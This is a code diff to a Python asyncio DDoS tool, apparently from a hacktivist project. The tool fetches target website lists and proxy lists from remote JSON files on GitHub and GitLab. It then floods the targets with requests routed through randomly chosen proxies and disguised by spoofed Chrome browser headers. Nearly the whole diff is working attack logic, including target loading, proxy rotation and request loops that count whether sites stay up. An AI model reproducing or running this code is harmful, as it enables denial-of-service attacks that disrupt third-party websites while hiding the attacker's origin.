@@ -5,6 +5,8 @@ import aiohttp
 import json
 import requests
 import threading
+import random
+
 from asyncio import Queue, sleep
 from sys import stderr
 from loguru import logger
@@ -19,9 +21,14 @@ MAX_REQUESTS_TO_SITE = 200
 MAX_FAIL_COUNT = 3
 READ_TIMEOUT = 10
 RELOAD_TARGETS_TIMEOUT = 10 #minutes
+RANDOM_PROXY_COUNT = 10
 
 SITES_HOSTS = ["https://gitlab.com/jacobean_jerboa/sample/-/raw/main/sample",
                "https://raw.githubusercontent.com/opengs/uashieldtargets/v2/sites.json"]
+
+DEFAULT_PROXIES_HOSTS = [
+    "https://raw.githubusercontent.com/opengs/uashieldtargets/v2/proxy.json"
+]
 
 
 class RequestCounter():
@@ -93,20 +100,39 @@ class JsonLoader:
             return data
 
     def loadHosts(self,hosts:list):
+            tmp = set()
+            for link in hosts:
+                while True:
+                    try:
+                        data = requests.get(link, timeout=5).json()
+                        break
+                    except:
+                        logger.info(f'error load {link} ')
+                        time.sleep(3)
+                        continue
+                for page in data:
+                    tmp.add(page["page"])
+            self._list = list(tmp)
+            self._count = len(self._list)
+            logger.info(f'loaded {self._count} hosts')    
+
+    def loadProxy(self,hosts:list):
         tmp = set()
         for link in hosts:
             while True:
                 try:
                     data = requests.get(link, timeout=5).json()
-                    for page in data:
-                        tmp.add(page["page"])
                     break
-                except Exception as e:
-                    logger.debug(f'Error processing url {link}, retry...')
+                except:
+                    logger.info(f'error load {link} ')
+                    time.sleep(3)
                     continue
-        self._list = list(tmp)
+            for page in data:
+                tmp.add(f'{page["scheme"]}://{page["ip"]}')
+
+        self._list = random.sample( list(tmp),RANDOM_PROXY_COUNT)                
         self._count = len(self._list)
-        logger.info(f'Loaded {self._count} hosts')
+        logger.info(f'loaded {self._count} proxies')
 
 
     def getAll(self):
@@ -129,9 +155,19 @@ TIMEOUT = aiohttp.ClientTimeout(
 HEADERS_TEMPLATE = {
     'Content-Type': 'text/html;',
     'Connection': 'keep-alive',
-    'Accept': 'text/*, text/html, text/html;level=1, */*',
-    'Accept-Language': 'ru',
-    'Accept-Encoding': 'gzip, deflate, br'
+    'Accept-Language': 'ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7, fr;q=0.6',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Charset': 'utf-8, iso-8859-1;q=0.5, *;q=0.1',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
+
+    'cache-control': 'max-age=0', 
+	'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"', 
+	'sec-ch-ua-mobile': '?0', 
+	'upgrade-insecure-requests': '1', 
+	'sec-fetch-site': 'none', 
+	'sec-fetch-mode': 'navigate', 
+	'sec-fetch-user': '?1', 
+	'sec-fetch-dest': 'document'
 }
 
 sites = JsonLoader(True)
@@ -147,7 +183,7 @@ def updateResources():
     if time.time() > lastupdate + 60 * RELOAD_TARGETS_TIMEOUT:
         lastupdate = time.time()
         sites.loadHosts(SITES_HOSTS)
-        proxies.loadFile("proxy.json","ip")
+        proxies.loadProxy(DEFAULT_PROXIES_HOSTS)
 
 def _get_headers() -> dict:
     headers = HEADERS_TEMPLATE.copy()
@@ -170,28 +206,27 @@ async def worker(worker_id: int,sem: asyncio.Semaphore):
                     async with sem:
                         status = -1
                         headers = _get_headers()
-                
                         try:
-                            response = await asyncio.wait_for(session.get(work_item.url, headers=headers, proxy=work_item.proxy, verify_ssl=False), timeout=READ_TIMEOUT)
-                            status = response.status
+                            async with session.head(work_item.url, proxy=work_item.proxy,headers=headers, verify_ssl=False) as response:
+                                status = response.status
                         except Exception as e:
-                            # logger.debug(f'Error processing url {work_item.url}')
+                            # logger.debug(f'Error processing url {work_item.url} - {e}')
                             pass
                         
                         work_item.request_count += 1
 
-                        if (200 <= status <= 302) or (status >= 500):
+                        if (200 <= status < 302):
                             # logger.warning(f'[{worker_id}]  {work_item.url} - {status}, proxy: {work_item.proxy} ({work_item.request_count})')
                             work_item.fail_count = 0
                             await rcounter.incrementAlive()
-                        else:
+                        else: # error 400-500 are not generate a lot of data, so ignore it
                             work_item.fail_count += 1
                             await rcounter.incrementNoResponse()
                             # logger.debug(f'[{worker_id}] {work_item.url} - {status}, proxy: {work_item.proxy} ({work_item.request_count})')
                             
                             if proxy_index < proxies.count():
                                 proxy_list = proxies.getAll()
-                                work_item.proxy = f'http://{proxy_list[proxy_index]}'
+                                work_item.proxy = proxy_list[proxy_index]
                                 proxy_index += 1
                         await asyncio.sleep(0)
 
